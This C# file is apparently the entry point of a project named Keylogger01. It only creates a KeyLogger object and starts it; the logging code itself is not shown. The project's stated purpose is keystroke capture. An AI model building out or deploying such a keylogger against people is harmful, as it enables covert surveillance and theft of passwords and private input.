using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;


namespace Keylogger01
{
    class Program
    {
        static void Main(string[] args)
        {
            KeyLogger keyLogger = new KeyLogger();
            keyLogger.start();

        }
    }

    
}
